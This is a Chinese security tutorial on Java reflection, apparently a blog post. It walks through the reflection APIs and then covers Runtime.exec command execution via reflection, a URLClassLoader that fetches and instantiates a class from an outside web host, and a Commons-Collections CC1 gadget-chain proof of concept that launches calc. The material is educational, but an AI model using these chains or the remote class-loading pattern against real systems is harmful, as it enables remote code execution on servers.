---
title: JavaEE应用&反射机制&类加载器&利用链&成员变量&构造方法&抽象方法
published: 2026-03-12 21:00:00
description: Java反射机制可以在程序运行时动态获取类的信息并操作其成员，这种特性既用于正常开发（如Spring框架），也可能被用于构造漏洞利用链（如CC1链）或内存马技术。
tags: [Web开发,JavaEE]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-JavaEE-类加载器&反射机制&链安全
2. 安全开发-JavaEE-成员变量&成员方法&构造方法

## 了解JAVA反射相关类

**Class是图纸，Field是图纸上的属性，Constructor是用图纸造房子的过程，Method是房子建好后能住人能做饭的功能。**

## 反射相关类

|     类名      |                     用途                     |
| :-----------: | :------------------------------------------: |
|    Class类    | 代表类的实体，在运行的Java程序中表示类的接口 |
|    Field类    |          代表类的成员变量、类的属性          |
|   Method类    |               代表类的成员方法               |
| Constructor类 |               代表类的构造方法               |

### 利用反射获取成员变量

Class类中用于获取成员变量的方法

|             方法              |          用途          |
| :---------------------------: | :--------------------: |
|     getField(String name)     | 获得某个公有的属性对象 |
|          getFields()          | 获得所有公有的属性对象 |
| getDeclaredField(String name) |    获得某个属性对象    |
|      getDeclaredFields()      |    获得所有属性对象    |

Filed类中用于创建对象的方法

|               方法                |  用途  |
| :-------------------------------: | :----: |
| Void set(Object obj,Object value) |  赋值  |
|      Object get(Object obj)       | 获取值 |

### 利用反射获取构造方法

Class类中用于获取构造方法的方法

|                       方法                       |                  用途                  |
| :----------------------------------------------: | :------------------------------------: |
|                getConstructors()                 |       获得该类的所有公有构造方法       |
|            getDeclaredConstructors()             |          获得该类所有构造方法          |
|     getConstructor(Class…<?> parameterTypes)     | 获得该类中与参数类型匹配的公有构造方法 |
| getDeclaredConstructor(Class…<?> parameterTypes) |   获得该类中与参数类型匹配的构造方法   |

Constructor类中用于创建对象的方法

|               方法               |             用途             |
| :------------------------------: | :--------------------------: |
| T newlnstance(Object.. initargs) |  根据指定的构造方法创建对象  |
|   setAccessible(boolean flag)    | 设置为true，表示取消访问检查 |

### 利用反射获取成员方法

Class类中用于获取成员方法的方法

|                           方法                           |          用途          |
| :------------------------------------------------------: | :--------------------: |
|                       getMethods()                       | 获得该类所有公有的方法 |
|                   getDeclaredMethods()                   |    获得该类所有方法    |
|     getMethod(String name, Class…<?> parameterTypes)     | 获得该类某个公有的方法 |
| getDeclaredMethod(String name, Class…<?> parameterTypes) |    获得该类某个方法    |

Method类中用于创建对象的方法

**`invoke` 就是：让某个对象执行某个方法！**

```java
Object invoke(Object obj,Object... args)：运行方法
参数一：用obj对象调用该方法
参数二：调用方法的传递的参数（如果没有就不写）
返回值：方法的返回值（如果没有就不写）
```

# 什么是Java反射

参考：https://xz.aliyun.com/t/9117

Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。该类库包含了Field、Method、Constructor等类。对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制。

在程序**运行时**，去获取一个类的完整内部信息（包括它有哪些属性、方法、构造器），并且可以**动态地**去操作它们。

正常情况下，一个设计良好的类（黑箱子）会把一些核心或敏感的东西藏起来，比如：

- **私有的抽屉**：在Java中用 `private` 关键字修饰的属性。正常情况下，外面的人不能直接打开这个抽屉。
- **内部的按钮**：用 `private` 或 `protected` 修饰的方法，只有内部人员才能按。

然而，有了反射这个"神奇扫描仪"后，情况就变了。

- **强行打开私密抽屉**：即使一个属性被标记为 `private`，反射依然可以找到它，并强行修改它的值。这就好比一个hacker用扫描仪发现了箱子里那个"密码"抽屉，然后强行把它改成"123456"。
- **按下危险按钮**：如果一个类内部有一个非常危险的、本该被小心调用的方法（比如 `deleteSystemFile()`），并且被标记为 `private`，正常情况下外部是无法调用的。但反射可以绕过这个检查，直接调用它，造成破坏。

# 为什么要用到反射

参考：https://xz.aliyun.com/t/9117

其实从官方定义中就能找到其存在的价值，在运行时获得程序或程序集中每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。划重点：**在运行时而不是编译时。（不改变原有代码逻辑，自行运行的时候动态创建和编译即可）**

# 反射机制应用

开发应用场景：

Spring框架的IOC基于反射创建对象和设置依赖属性。

SpringMVC的请求调用对应方法，也是通过反射。

JDBC的Class#forName(String className)方法，也是使用反射。

# 反射安全应用场景

构造利用链，触发命令执行

反序列化中的利用链构造

动态获取或执行任意类中的属性或方法

动态代理的底层原理是反射技术

rmi反序列化也涉及到反射操作

# Java-反射-Class对象类获取

# User类

```java
package entity;

public class User {
    public String name = "root";
    public int age = 18;
    private String address = "localhost";
    protected String gender = "male";

    public void setName(String name) {
        this.name = name;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public void setAddress(String address) {
        this.address = address;
    }

    public void setGender(String gender) {
        this.gender = gender;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }

    public String getAddress() {
        return address;
    }

    public String getGender() {
        return gender;
    }

    /*构造方法*/
    /*必须和类名相同（User）、没有返回值类型、创建对象时调用*/
    public User(){
        super();
    }

    public User(String name, int age, String address, String gender){
        this.name = name;
        this.age = age;
        this.address = address;
        this.gender = gender;
    }

    private User(String name,String address){
        this.name = name;
        this.address = address;
    }

    /*普通方法*/
    /*可以任意（Users）、必须有返回值类型（void也算）、对象创建后调用*/
    public void Users(String name, int age, String address, String gender){
        this.name = name;
        this.age = age;
        this.address = address;
        this.gender = gender;
    }

    private void UserInfo(String name, String address){
        this.name = name;
        this.address = address;
    }

    @Override
    public String toString() {
        return "User{name='" + name + "', address='" + address + "'}";
    }
}

```

## 根据全限定类名

```java
根据全限定类名：Class.forName("全路径类名")
Class aClass1 = Class.forName("com.example.reflectdemo.User");
```

```java
// GetClass.java
public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        Class aclass = Class.forName("entity.User");
        System.out.println(aclass);
    }
}
```

## 根据对象

```
根据对象：对象.getClass()
User user = new User();
Class bClass = user.getClass();
```

```java
// GetClass.java
public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        User user = new User();
        Class bclass = user.getClass();
        System.out.println(bclass);
    }
}
```

## 根据类名

```
根据类名：类名.class
Class userClass = User.class;
```

```java
// GetClass.java
public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        Class userclass = User.class;
        System.out.println(userclass);
    }
}
```

## 通过类加载器获得Class对象

```
通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass("全路径类名");
ClassLoader clsload=ClassLoader.getSystemClassLoader();
Class aClass2 = clsload.loadClass("com.example.reflectdemo.User");
```

```java
// GetClass.java
public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        Class cclass = classLoader.loadClass("entity.User");
        System.out.println(cclass);
    }
}
```

# Java-反射-Field成员变量类获取

前提：

```java
/*先获取类*/
User user = new User();
Class userclass = user.getClass();
```

## 获取公共成员变量对象

```java
Field[] fields = userclass.getFields();
for (Field field : fields){
	System.out.println(field);
}
```

## 获取所有成员变量对象

```java
Field[] declaredFields = userclass.getDeclaredFields();
for (Field field1 : declaredFields){
	System.out.println(field1);
}
```

## 获取指定的公共,私有单个成员变量对象

```java
//Field field = userclass.getField("age"); // 公共
Field field = userclass.getDeclaredField("address"); // 私有
System.out.println(field);
```

## 成员变量值获取和赋值

```java
Field updatefield = userclass.getField("name");
updatefield.set(user,"123"); // 赋值
Object a = updatefield.get(user); // 变量值获取
System.out.println(a);
```

# Java-反射-Method成员方法类获取

```
/*先获取类*/
User user = new User();
Class userclass = user.getClass();
```

## 返回所有公共成员方法对象的数组，包括继承的

```java
// 在Java中，所有类都默认继承 Object 类
Method[] methods = userclass.getMethods();
for (Method m:methods){
	System.out.println(m);
}
System.out.println("----------");
```

## 返回所有成员方法对象的数组，不包括继承的

```java
Method[] declaredMethods = userclass.getDeclaredMethods();
for (Method m1:declaredMethods){
	System.out.println(m1);
}
System.out.println("----------");
```

## 不带参数的公共方法获取

```java
Method method = userclass.getMethod("getAge");
System.out.println(method);
System.out.println("----------");
```

## 带参数的公共方法获取

```java
Method method1 = userclass.getMethod("setAddress",String.class);
System.out.println(method1);
System.out.println("----------");
```

## 返回单个成员（公共、私有、保护等）方法对象

```java
Method method2 = userclass.getMethod("User", String.class, int.class, String.class, String.class);
//  Method method2 = userclass.getDeclaredMethod("UserInfo", String.class, String.class);
System.out.println(method2);
System.out.println("----------");
```

## 运行方法invoke(反序列化 最常调用)

```java
Method setname = userclass.getDeclaredMethod("UserInfo", String.class, String.class);
// 私有需要开启临时
setname.setAccessible(true);
setname.invoke(user,"lucius","ShenZhen");
// 获取
String[] methodNames = {"getName","getAddress"};
Method[] methods2 = new Method[methodNames.length];
for (int i = 0; i < methodNames.length; i++){
	methods2[i] = userclass.getMethod(methodNames[i]);
}
for (Method m:methods2){
	System.out.println(m.invoke(user));
}
```

# Java-反射-Constructor构造方法类获取

```
/*先获取类*/
User user = new User();
Class userclass = user.getClass();
```

## 返回所有公共构造方法对象的数组

```java
Constructor[] constructors = userclass.getConstructors();
for (Constructor con:constructors){
	System.out.println(con);
}
System.out.println("----------");
```

## 获取所有的构造方法(public、private)

```java
Constructor[] declaredConstructors = userclass.getDeclaredConstructors();
for (Constructor con1:declaredConstructors){
	System.out.println(con1);
}
System.out.println("----------");
```

## 返回单个公共构造方法

```java
// 无参构造
// Constructor constructor = userclass.getConstructor();
// 有参构造
Constructor constructor = userclass.getConstructor(String.class,int.class,String.class,String.class);
System.out.println(constructor);
System.out.println("----------");
```

## 返回单个构造方法对象

```java
// Constructor con2 = userclass.getDeclaredConstructor(String.class,String.class);
// System.out.println(con2);
Constructor con2= userclass.getDeclaredConstructor(String.class,String.class);
con2.setAccessible(true);
User uu=(User) con2.newInstance("xiaoli","shenzhen");
System.out.println(uu);

// User类文件(User.java)中
@Override
public String toString() {
	return "User{name='" + name + "', address='" + address + "'}";
}
```

# Java-反射-不安全命令执行&类加载链构造

## 安全应用案例-反射实现命令执行

### 原型

```
Runtime.getRuntime().exec("calc");
```

### 反射

```java
// 通过反射加载Runtime类
Class<?> rtclass = Class.forName("java.lang.Runtime");

/*利用method*/
// 查看Runtime类有哪些方法
/*这部分只是了解getRuntime这个成员方法在哪里*/
/*以及exec*/
//Method[] methods = rtclass.getMethods();
//for (Method method : methods) {
//	System.out.println(method);
//}

// 获取这两种成员方法，拿到exec()和getRuntime()方法的Method对象
Method exec = rtclass.getMethod("exec", String.class);
Method getruntime = rtclass.getMethod("getRuntime");
// 将对象添加为变量修改并执行
// 调用getRuntime()得到Runtime对象
Object runtime = getruntime.invoke(rtclass);
// 用这个对象调用exec()打开计算器
exec.invoke(runtime,"calc.exe");

/*------------------------------------------*/
 
// 通过反射加载Runtime类
Class<?> rtclass = Class.forName("java.lang.Runtime");

/*利用Constructor*/
// 获取Runtime类的私有无参构造方法
Constructor<?> method = rtclass.getDeclaredConstructor();
// 由于构造方法是私有的，需要取消访问权限检查才能使用
method.setAccessible(true);
// 通过私有构造方法创建Runtime对象，然后调用exec方法打开计算器
// .getMethod("exec", String.class) 只是拿到方法
// 使用新创建的Runtime对象也就是method.newInstance()来调用
rtclass.getMethod("exec", String.class).invoke(method.newInstance(), "calc");
```

### 代码部分

```java
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class GetRuntimeCalc {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // Runtime.getRuntime().exec("calc");
        // getRuntime() 公共的成员方法

        Class<?> rtclass = Class.forName("java.lang.Runtime");
        /*这部分只是了解getRuntime这个成员方法在哪里*/
        /*以及exec*/
//        Method[] methods = rtclass.getMethods();
//        for (Method method : methods) {
//            System.out.println(method);
//        }
        /*------------------------------------------*/
        Method exec = rtclass.getMethod("exec", String.class);
        Method getruntime = rtclass.getMethod("getRuntime");
        Object runtime = getruntime.invoke(rtclass);
        exec.invoke(runtime,"calc.exe");
    }
}
```

## 安全应用案例-不安全的利用链

指应用程序使用具有反射功能的外部输入来选择要使用的类或代码，

可能被攻击者利用而输入或选择不正确的类。绕过身份验证或访问控制检查

参考分析：https://zhuanlan.zhihu.com/p/165273855

### 本地类加载

```java
import java.io.File;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;

public class ClassLoaderLocal {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        // 创建一个File对象，指向F盘根目录
        File file = new File("f:/");
        // 将文件路径转换为URI格式（如：file:/f:/）
        URI uri = file.toURI();
        // 将URI转换为URL格式（URLClassLoader需要的格式）
        URL url = file.toURL();

        // 创建URLClassLoader，指定从F盘根目录加载类
        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        // 从F盘加载名为"TestRuntime"的类
        Class clazz = classLoader.loadClass("TestRuntime");
        // 创建TestRuntime类的实例（调用无参构造方法）
        clazz.newInstance();
    }
}
```

### 远程类加载

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class ClassLoaderUrl {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        
        // 创建一个URL对象，指向网络上的一个地址
        // 这里是从"www.xiaodi8.com"这个网站加载类
        URL url = new URL("http://www.xiaodi8.com/");
        
        // 创建URLClassLoader，指定从该网址加载类
        // 这意味着它会去这个网站找.class文件
        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        
        // 从网站加载名为"cc1"的类
        // 实际会去 http://www.xiaodi8.com/cc1.class 找这个文件
        Class clazz = classLoader.loadClass("cc1");
        
        // 创建cc1类的实例（调用无参构造方法）
        clazz.newInstance();
    }
}
```

## CC1.java利用链

```java
javac -cp ".\commons-collections-3.1.jar;." .\cc1.java
```

利用结合：https://xz.aliyun.com/t/7031（反序列化利用链）

先添加依赖项：

```xml
<dependency>
	<groupId>commons-collections</groupId>
	<artifactId>commons-collections</artifactId>
	<version>3.1</version>
</dependency>
```

POC代码：

```java
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class cc1 {

    // 这里需要改为构造方法
    public cc1() throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //触发漏洞
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
        onlyElement.setValue("foobar");
    }
}
```

之后下载该版本的jar包，放到代码同目录下，在终端引用库，编译此代码文件：

```cmd
javac -cp ".\commons-collections-3.1.jar;." .\cc1.java
```

打开本地类加载修改相应的代码部分执行，即可弹出计算器。

## 安全应用案例-内存马技术

演示生成项目：https://github.com/pen4uin/java-memshell-generator

![image-20260312211312398](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260312211312398.png)

![image-20260312211343530](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260312211343530.png)

![image-20260312211401002](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260312211401002.png)